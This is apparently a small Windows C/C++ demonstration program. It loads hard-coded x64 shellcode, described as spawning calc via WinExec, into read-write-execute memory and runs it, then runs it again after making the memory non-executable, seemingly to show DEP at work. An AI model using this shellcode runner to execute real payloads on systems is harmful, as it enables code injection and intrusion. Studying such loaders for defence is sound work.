#include <windows.h>
#include <stdio.h>
#include <conio.h>

void exec_shellcode(void* addr) {
    __try {
        ((void(*)())addr)();
        printf("[+] Executed %p\n", addr);
    }
    __except (1) {
        printf("[-] Exception %08lx\n", GetExceptionCode());
    }
    return;
}

int main(void) {
    // Based on https://github.com/vyrus001/shellGo/blob/master/main.go
    // Spawns calc via WinExec
    unsigned char shellcode[] = {
        0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54,
        0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76,
        0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17,
        0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17,
        0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F,
        0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4,
        0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3,
    };

    // Allocate a memory region with RWX permissions
    void* exec_mem = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) {
        printf("Memory allocation failed\n");
        return 1;
    }

    // Copy the shellcode to the allocated memory
    RtlMoveMemory(exec_mem, shellcode, sizeof(shellcode));

    // Cast the allocated memory as a function and execute it
    exec_shellcode(exec_mem);

    // Change memory to RW and try to execute again
    DWORD old{};
    VirtualProtect(exec_mem, sizeof(shellcode), PAGE_READWRITE, &old);
    exec_shellcode(exec_mem);

    return 0;
}